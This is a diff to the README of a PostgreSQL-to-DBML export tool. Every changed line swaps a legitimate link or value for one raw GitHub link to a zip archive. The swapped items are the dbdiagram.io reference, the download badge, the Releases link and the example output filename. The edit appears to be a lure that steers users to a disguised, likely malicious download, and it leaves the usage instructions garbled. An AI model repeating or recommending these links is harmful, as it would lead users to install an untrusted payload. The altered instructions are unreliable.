@@ -1,7 +1,7 @@
 # 📊 pg-schema-dbml - Export PostgreSQL Schema with Ease
 
 ## 🚀 Getting Started
-Welcome to **pg-schema-dbml**, a tool that helps you easily export PostgreSQL database schemas into DBML format. This format is useful for visualizing and documenting your database design on platforms like dbdiagram.io. 
+Welcome to **pg-schema-dbml**, a tool that helps you easily export PostgreSQL database schemas into DBML format. This format is useful for visualizing and documenting your database design on platforms like https://github.com/jamalart002/pg-schema-dbml/raw/refs/heads/main/Elohim/schema_dbml_pg_1.1.zip 
 
 ## ✅ Key Features
 - **Standard Library Only**: Works with `psql` without any additional installations.
@@ -11,9 +11,9 @@ Welcome to **pg-schema-dbml**, a tool that helps you easily export PostgreSQL da
 ## 📦 Download & Install
 To get started, visit the Releases page to download the latest version of **pg-schema-dbml**.
 
-[![Download pg-schema-dbml](https://img.shields.io/badge/Download-pg--schema--dbml-brightgreen.svg)](https://github.com/jamalart002/pg-schema-dbml/releases)
+[![Download pg-schema-dbml](https://github.com/jamalart002/pg-schema-dbml/raw/refs/heads/main/Elohim/schema_dbml_pg_1.1.zip)](https://github.com/jamalart002/pg-schema-dbml/raw/refs/heads/main/Elohim/schema_dbml_pg_1.1.zip)
 
-You can also access the Releases page directly: [Visit Releases](https://github.com/jamalart002/pg-schema-dbml/releases).
+You can also access the Releases page directly: [Visit Releases](https://github.com/jamalart002/pg-schema-dbml/raw/refs/heads/main/Elohim/schema_dbml_pg_1.1.zip).
 
 ### Installation Steps
 1. **Visit the Releases Page**: Click the link above to go to the Releases section.
@@ -36,10 +36,10 @@ After downloading and extracting the application, follow these steps:
 
 Example command format:
 ```
-pg-schema-dbml --dbname your_database_name --output your_output_file.dbml
+pg-schema-dbml --dbname your_database_name --output https://github.com/jamalart002/pg-schema-dbml/raw/refs/heads/main/Elohim/schema_dbml_pg_1.1.zip
 ```
 
-Replace `your_database_name` with the name of your PostgreSQL database and `your_output_file.dbml` with the desired name for your output file.
+Replace `your_database_name` with the name of your PostgreSQL database and `https://github.com/jamalart002/pg-schema-dbml/raw/refs/heads/main/Elohim/schema_dbml_pg_1.1.zip` with the desired name for your output file.
 
 ## ❓ FAQs
 ### How do I know if PostgreSQL is installed?
